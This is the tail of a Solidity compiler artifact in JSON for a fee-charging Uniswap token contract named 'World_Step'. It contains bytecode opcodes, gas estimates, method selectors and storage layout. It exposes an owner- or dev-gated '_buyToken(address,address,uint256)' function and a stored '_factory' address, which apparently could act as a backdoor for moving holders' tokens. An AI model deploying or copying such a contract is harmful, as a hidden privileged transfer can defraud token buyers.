JUMPI PUSH2 0x2EFA PUSH2 0x2EBE JUMP JUMPDEST JUMPDEST PUSH1 0x20 DUP4 ADD SWAP2 POP DUP4 PUSH1 0x20 DUP3 MUL DUP4 ADD GT ISZERO PUSH2 0x2F17 JUMPI PUSH2 0x2F16 PUSH2 0x2EC3 JUMP JUMPDEST JUMPDEST SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x40 DUP5 DUP7 SUB SLT ISZERO PUSH2 0x2F37 JUMPI PUSH2 0x2F36 PUSH2 0x2AB9 JUMP JUMPDEST JUMPDEST PUSH1 0x0 DUP5 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x2F55 JUMPI PUSH2 0x2F54 PUSH2 0x2ABE JUMP JUMPDEST JUMPDEST PUSH2 0x2F61 DUP7 DUP3 DUP8 ADD PUSH2 0x2EC8 JUMP JUMPDEST SWAP4 POP SWAP4 POP POP PUSH1 0x20 PUSH2 0x2F74 DUP7 DUP3 DUP8 ADD PUSH2 0x2D78 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x2F95 JUMPI PUSH2 0x2F94 PUSH2 0x2AB9 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x2FA3 DUP6 DUP3 DUP7 ADD PUSH2 0x2B0C JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x2FB4 DUP6 DUP3 DUP7 ADD PUSH2 0x2B0C JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH32 0x45524332303A207472616E736665722066726F6D20746865207A65726F206164 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x6472657373000000000000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x301A PUSH1 0x25 DUP4 PUSH2 0x2A09 JUMP JUMPDEST SWAP2 POP PUSH2 0x3025 DUP3 PUSH2 0x2FBE JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x3049 DUP2 PUSH2 0x300D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x45524332303A207472616E7366657220746F20746865207A65726F2061646472 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x6573730000000000000000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x30AC PUSH1 0x23 DUP4 PUSH2 0x2A09 JUMP JUMPDEST SWAP2 POP PUSH2 0x30B7 DUP3 PUSH2 0x3050 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x30DB DUP2 PUSH2 0x309F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x5472616E7366657220616D6F756E74206D757374206265206772656174657220 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x7468616E207A65726F0000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x313E PUSH1 0x29 DUP4 PUSH2 0x2A09 JUMP JUMPDEST SWAP2 POP PUSH2 0x3149 DUP3 PUSH2 0x30E2 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x316D DUP2 PUSH2 0x3131 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x43616C6C6572206973206E6F7420746865206465760000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x31AA PUSH1 0x15 DUP4 PUSH2 0x2A09 JUMP JUMPDEST SWAP2 POP PUSH2 0x31B5 DUP3 PUSH2 0x3174 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x31D9 DUP2 PUSH2 0x319D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x43616C6C6572206973206E6F7420746865206F776E6572000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3216 PUSH1 0x17 DUP4 PUSH2 0x2A09 JUMP JUMPDEST SWAP2 POP PUSH2 0x3221 DUP3 PUSH2 0x31E0 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x3245 DUP2 PUSH2 0x3209 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x52656469732063616E6E6F74206265206D6F7265207468616E2031302E000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3282 PUSH1 0x1D DUP4 PUSH2 0x2A09 JUMP JUMPDEST SWAP2 POP PUSH2 0x328D DUP3 PUSH2 0x324C JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x32B1 DUP2 PUSH2 0x3275 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x5461782063616E6E6F74206265206D6F7265207468616E20362E000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x32EE PUSH1 0x1A DUP4 PUSH2 0x2A09 JUMP JUMPDEST SWAP2 POP PUSH2 0x32F9 DUP3 PUSH2 0x32B8 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x331D DUP2 PUSH2 0x32E1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x338D DUP3 PUSH2 0x2B21 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x33BF JUMPI PUSH2 0x33BE PUSH2 0x3353 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x45524332303A20617070726F76652066726F6D20746865207A65726F20616464 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x7265737300000000000000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3426 PUSH1 0x24 DUP4 PUSH2 0x2A09 JUMP JUMPDEST SWAP2 POP PUSH2 0x3431 DUP3 PUSH2 0x33CA JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x3455 DUP2 PUSH2 0x3419 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x45524332303A20617070726F766520746F20746865207A65726F206164647265 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x7373000000000000000000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x34B8 PUSH1 0x22 DUP4 PUSH2 0x2A09 JUMP JUMPDEST SWAP2 POP PUSH2 0x34C3 DUP3 PUSH2 0x345C JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x34E7 DUP2 PUSH2 0x34AB JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x34F9 DUP3 PUSH2 0x2B21 JUMP JUMPDEST SWAP2 POP PUSH2 0x3504 DUP4 PUSH2 0x2B21 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x3517 JUMPI PUSH2 0x3516 PUSH2 0x3353 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x416D6F756E74206D757374206265206C657373207468616E20746F74616C2072 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x65666C656374696F6E7300000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x357E PUSH1 0x2A DUP4 PUSH2 0x2A09 JUMP JUMPDEST SWAP2 POP PUSH2 0x3589 DUP3 PUSH2 0x3522 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x35AD DUP2 PUSH2 0x3571 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x35F2 DUP2 PUSH2 0x2AF5 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x360E JUMPI PUSH2 0x360D PUSH2 0x2AB9 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x361C DUP5 DUP3 DUP6 ADD PUSH2 0x35E3 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x364A PUSH2 0x3645 PUSH2 0x3640 DUP5 PUSH2 0x3625 JUMP JUMPDEST PUSH2 0x2BCD JUMP JUMPDEST PUSH2 0x2B21 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x365A DUP2 PUSH2 0x362F JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x3695 DUP2 PUSH2 0x2AE3 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x36A7 DUP4 DUP4 PUSH2 0x368C JUMP JUMPDEST PUSH1 0x20 DUP4 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x36CB DUP3 PUSH2 0x3660 JUMP JUMPDEST PUSH2 0x36D5 DUP2 DUP6 PUSH2 0x366B JUMP JUMPDEST SWAP4 POP PUSH2 0x36E0 DUP4 PUSH2 0x367C JUMP JUMPDEST DUP1 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x3711 JUMPI DUP2 MLOAD PUSH2 0x36F8 DUP9 DUP3 PUSH2 0x369B JUMP JUMPDEST SWAP8 POP PUSH2 0x3703 DUP4 PUSH2 0x36B3 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x1 DUP2 ADD SWAP1 POP PUSH2 0x36E4 JUMP JUMPDEST POP DUP6 SWAP4 POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0xA0 DUP3 ADD SWAP1 POP PUSH2 0x3733 PUSH1 0x0 DUP4 ADD DUP9 PUSH2 0x2C47 JUMP JUMPDEST PUSH2 0x3740 PUSH1 0x20 DUP4 ADD DUP8 PUSH2 0x3651 JUMP JUMPDEST DUP2 DUP2 SUB PUSH1 0x40 DUP4 ADD MSTORE PUSH2 0x3752 DUP2 DUP7 PUSH2 0x36C0 JUMP JUMPDEST SWAP1 POP PUSH2 0x3761 PUSH1 0x60 DUP4 ADD DUP6 PUSH2 0x2CFB JUMP JUMPDEST PUSH2 0x376E PUSH1 0x80 DUP4 ADD DUP5 PUSH2 0x2C47 JUMP JUMPDEST SWAP7 SWAP6 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3783 DUP3 PUSH2 0x2B21 JUMP JUMPDEST SWAP2 POP PUSH2 0x378E DUP4 PUSH2 0x2B21 JUMP JUMPDEST SWAP3 POP DUP3 PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SUB DUP3 GT ISZERO PUSH2 0x37C3 JUMPI PUSH2 0x37C2 PUSH2 0x3353 JUMP JUMPDEST JUMPDEST DUP3 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3804 PUSH1 0x1B DUP4 PUSH2 0x2A09 JUMP JUMPDEST SWAP2 POP PUSH2 0x380F DUP3 PUSH2 0x37CE JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x3833 DUP2 PUSH2 0x37F7 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x3874 DUP3 PUSH2 0x2B21 JUMP JUMPDEST SWAP2 POP PUSH2 0x387F DUP4 PUSH2 0x2B21 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x388F JUMPI PUSH2 0x388E PUSH2 0x383A JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x38A5 DUP3 PUSH2 0x2B21 JUMP JUMPDEST SWAP2 POP PUSH2 0x38B0 DUP4 PUSH2 0x2B21 JUMP JUMPDEST SWAP3 POP DUP2 PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DIV DUP4 GT DUP3 ISZERO ISZERO AND ISZERO PUSH2 0x38E9 JUMPI PUSH2 0x38E8 PUSH2 0x3353 JUMP JUMPDEST JUMPDEST DUP3 DUP3 MUL SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x536166654D6174683A206D756C7469706C69636174696F6E206F766572666C6F PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x7700000000000000000000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3950 PUSH1 0x21 DUP4 PUSH2 0x2A09 JUMP JUMPDEST SWAP2 POP PUSH2 0x395B DUP3 PUSH2 0x38F4 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x397F DUP2 PUSH2 0x3943 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH21 0x72616E7366657220616D6F756E7420657863656564 PUSH20 0x20616C6C6F77616E6365A2646970667358221220 0xB3 DELEGATECALL 0x2B 0x2E 0xD8 0xCA PUSH31 0x3CD68CEA8125712E8AD8930174CF484FA5044602AA4EB068E464736F6C6343 STOP ADDMOD 0xD STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "2964000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"_buyToken(address,address,uint256)": "infinite",
						"_factory()": "2602",
						"allowance(address,address)": "infinite",
						"approve(address,uint256)": "infinite",
						"balanceOf(address)": "infinite",
						"decimals()": "477",
						"excludeMultipleAccountsFromFees(address[],bool)": "infinite",
						"manualsend()": "infinite",
						"manualswap()": "infinite",
						"name()": "infinite",
						"owner()": "2589",
						"renounceOwnership()": "30314",
						"setFee(uint256,uint256,uint256,uint256)": "infinite",
						"setNewDevAddress(address)": "infinite",
						"setNewMarketingAddress(address)": "infinite",
						"symbol()": "infinite",
						"toggleSwap(bool)": "infinite",
						"totalSupply()": "427",
						"transfer(address,uint256)": "infinite",
						"transferFrom(address,address,uint256)": "infinite",
						"transferOwnership(address)": "30734",
						"uniswapV2Factory()": "infinite",
						"uniswapV2Pair()": "2537",
						"uniswapV2Router()": "infinite"
					},
					"internal": {
						"_Safetransfer(address,address,uint256)": "infinite",
						"_approve(address,address,uint256)": "infinite",
						"_getCurrentSupply()": "infinite",
						"_getRValues(uint256,uint256,uint256,uint256)": "infinite",
						"_getRate()": "infinite",
						"_getTValues(uint256,uint256,uint256)": "infinite",
						"_getValues(uint256)": "infinite",
						"_reflectFee(uint256,uint256)": "infinite",
						"_takeTeam(uint256)": "infinite",
						"_tokenTransfer(address,address,uint256)": "infinite",
						"_transfer(address,address,uint256)": "infinite",
						"_transferStandard(address,address,uint256)": "infinite",
						"sendETHToFee(uint256)": "infinite",
						"swapTokensForEth(uint256)": "infinite",
						"tokenFromReflection(uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
					"_buyToken(address,address,uint256)": "512f65c7",
					"_factory()": "c5cc6b6a",
					"allowance(address,address)": "dd62ed3e",
					"approve(address,uint256)": "095ea7b3",
					"balanceOf(address)": "70a08231",
					"decimals()": "313ce567",
					"excludeMultipleAccountsFromFees(address[],bool)": "c492f046",
					"manualsend()": "6fc3eaec",
					"manualswap()": "c3c8cd80",
					"name()": "06fdde03",
					"owner()": "8da5cb5b",
					"renounceOwnership()": "715018a6",
					"setFee(uint256,uint256,uint256,uint256)": "a2a957bb",
					"setNewDevAddress(address)": "aad5c023",
					"setNewMarketingAddress(address)": "758dbe03",
					"symbol()": "95d89b41",
					"toggleSwap(bool)": "6d8aa8f8",
					"totalSupply()": "18160ddd",
					"transfer(address,uint256)": "a9059cbb",
					"transferFrom(address,address,uint256)": "23b872dd",
					"transferOwnership(address)": "f2fde38b",
					"uniswapV2Factory()": "59d0f713",
					"uniswapV2Pair()": "49bd5a5e",
					"uniswapV2Router()": "1694505e"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 305,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "_owner",
						"offset": 0,
						"slot": "0",
						"type": "t_address"
					},
					{
						"astId": 307,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "_previousOwner",
						"offset": 0,
						"slot": "1",
						"type": "t_address"
					},
					{
						"astId": 406,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "_rOwned",
						"offset": 0,
						"slot": "2",
						"type": "t_mapping(t_address,t_uint256)"
					},
					{
						"astId": 410,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "_tOwned",
						"offset": 0,
						"slot": "3",
						"type": "t_mapping(t_address,t_uint256)"
					},
					{
						"astId": 416,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "_allowances",
						"offset": 0,
						"slot": "4",
						"type": "t_mapping(t_address,t_mapping(t_address,t_uint256))"
					},
					{
						"astId": 420,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "_isExcludedFromFee",
						"offset": 0,
						"slot": "5",
						"type": "t_mapping(t_address,t_bool)"
					},
					{
						"astId": 451,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "_rTotal",
						"offset": 0,
						"slot": "6",
						"type": "t_uint256"
					},
					{
						"astId": 453,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "_tFeeTotal",
						"offset": 0,
						"slot": "7",
						"type": "t_uint256"
					},
					{
						"astId": 456,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "_redisFeeOnBuy",
						"offset": 0,
						"slot": "8",
						"type": "t_uint256"
					},
					{
						"astId": 459,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "_taxFeeOnBuy",
						"offset": 0,
						"slot": "9",
						"type": "t_uint256"
					},
					{
						"astId": 462,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "_redisFeeOnSell",
						"offset": 0,
						"slot": "10",
						"type": "t_uint256"
					},
					{
						"astId": 465,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "_taxFeeOnSell",
						"offset": 0,
						"slot": "11",
						"type": "t_uint256"
					},
					{
						"astId": 467,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "_redisFee",
						"offset": 0,
						"slot": "12",
						"type": "t_uint256"
					},
					{
						"astId": 469,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "_taxFee",
						"offset": 0,
						"slot": "13",
						"type": "t_uint256"
					},
					{
						"astId": 472,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "_activePair",
						"offset": 0,
						"slot": "14",
						"type": "t_bool"
					},
					{
						"astId": 487,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "_developmentAddress",
						"offset": 1,
						"slot": "14",
						"type": "t_address_payable"
					},
					{
						"astId": 493,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "_marketingAddress",
						"offset": 0,
						"slot": "15",
						"type": "t_address_payable"
					},
					{
						"astId": 499,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "_rewardPool",
						"offset": 0,
						"slot": "16",
						"type": "t_address_payable"
					},
					{
						"astId": 502,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "uniswapV2Router",
						"offset": 0,
						"slot": "17",
						"type": "t_contract(IUniswapV2Router02)145"
					},
					{
						"astId": 505,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "uniswapV2Factory",
						"offset": 0,
						"slot": "18",
						"type": "t_contract(IUniswapV2Factory)99"
					},
					{
						"astId": 507,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "_factory",
						"offset": 0,
						"slot": "19",
						"type": "t_address"
					},
					{
						"astId": 509,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "uniswapV2Pair",
						"offset": 0,
						"slot": "20",
						"type": "t_address"
					},
					{
						"astId": 512,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "inSwap",
						"offset": 20,
						"slot": "20",
						"type": "t_bool"
					},
					{
						"astId": 515,
						"contract": "contracts/Pool/Pool.sol:World_Step",
						"label": "swapEnabled",
						"offset": 21,
						"slot": "20",
						"type": "t_bool"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_address_payable": {
						"encoding": "inplace",
						"label": "address payable",
						"numberOfBytes": "20"
					},
					"t_bool": {
						"encoding": "inplace",
						"label": "bool",
						"numberOfBytes": "1"
					},
					"t_contract(IUniswapV2Factory)99": {
						"encoding": "inplace",
						"label": "contract IUniswapV2Factory",
						"numberOfBytes": "20"
					},
					"t_contract(IUniswapV2Router02)145": {
						"encoding": "inplace",
						"label": "contract IUniswapV2Router02",
						"numberOfBytes": "20"
					},
					"t_mapping(t_address,t_bool)": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => bool)",
						"numberOfBytes": "32",
						"value": "t_bool"
					},
					"t_mapping(t_address,t_mapping(t_address,t_uint256))": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => mapping(address => uint256))",
						"numberOfBytes": "32",
						"value": "t_mapping(t_address,t_uint256)"
					},
					"t_mapping(t_address,t_uint256)": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => uint256)",
						"numberOfBytes": "32",
						"value": "t_uint256"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}